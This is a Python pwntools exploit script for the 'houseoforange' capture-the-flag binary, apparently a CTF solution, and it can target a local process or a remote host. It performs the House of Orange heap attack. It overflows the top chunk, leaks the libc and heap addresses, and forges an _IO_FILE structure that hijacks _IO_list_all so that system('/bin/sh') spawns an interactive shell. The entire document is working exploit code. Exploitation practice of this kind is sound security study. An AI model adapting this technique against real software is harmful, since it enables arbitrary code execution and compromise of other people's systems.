#!/usr/bin/env python3

from pwn import *

context(os="linux", arch="amd64", log_level="info")
localfile = "houseoforange"
locallibc = "/lib/x86_64-linux-gnu/libc.so.6"           # GLIBC 2.23-0ubuntu11.2
# locallibc = "../glibc_versions/2.23/x64_notcache/lib/libc-2.23.so"

pf      = lambda name,num           :log.info(name + ": 0x%x" % num)

def build(length, name):
    io.recvuntil("Your choice : ")
    io.sendline("1")
    io.recvuntil("Length of name :")
    io.sendline(str(length))
    io.recvuntil("Name :")
    io.send(name)
    io.recvuntil("Price of Orange:")
    io.sendline("1")
    io.recvuntil("Color of Orange:")
    io.sendline("1")

def upgrade(length, name):
    io.recvuntil("Your choice : ")
    io.sendline("3")
    io.recvuntil("Length of name :")
    io.sendline(str(length))
    io.recvuntil("Name:")
    io.send(name)
    io.recvuntil("Price of Orange: ")
    io.sendline("1")
    io.recvuntil("Color of Orange: ")
    io.sendline("1")


def exp():
    build(0x200 - 0x20 - 0x20 - 0x10, "A")
    upgrade(0x1b0+0x20+0x10, b"A"*0x1d8 + p64(0xe01))
    build(0x1000, "A")

    # gdb.attach(io, "b genops.c:759")
    # gdb.attach(io, "b *$rebase(0x13D5)")

    # leak libc base 
    build(0x400, "A"*8)
    io.recvuntil("Your choice : ")
    io.sendline("2")
    io.recvuntil("Name of house : ")
    libc_addr = u64(io.recvline()[8:-1].ljust(8, b"\x00"))
    pf("libc base", libc_addr)
    libc_base = libc_addr - 0x3C5178
    # libc_base = libc_addr - 0x39C178
    pf("libc base", libc_base)

    # leak heap addr
    upgrade(0x10, "A"*0x10)
    io.recvuntil("Your choice : ")
    io.sendline("2")
    io.recvuntil("Name of house : ")
    heap_addr = u64(io.recvline()[16:-1].ljust(8, b"\x00"))
    pf("heap addr", heap_addr)

    # IO_FILE
    payload  = b"A"*0x420
    payload += b"/bin/sh\x00" + p64(0x61)                               # start offset: 0x0
    payload += b"A"*0x8 + p64(libc_base+libc.sym["_IO_list_all"]-0x10)  # start offset: 0x10
    payload += p64(2) + p64(3) + b"A"*0x90                              # start offset: 0x20
    payload += p64(0) + b"A"*0x10                                       # start offset: 0xc0
    payload += p64(heap_addr+0x430+0xe0)                                # start offset: 0xd8
    payload += b"A"*0x18 + p64(libc_base+libc.sym["system"])            # start offset: 0xe0
    upgrade(len(payload), payload)

    io.recvuntil("Your choice : ")
    io.sendline("1")

    io.interactive()




argc = len(sys.argv)
if argc == 1:
    io = process(localfile)
else:
    if argc == 2:
        host, port = sys.argv[1].split(":")
    elif argc == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    io = remote(host, port)

elf = ELF(localfile)
libc = ELF(locallibc)
exp()
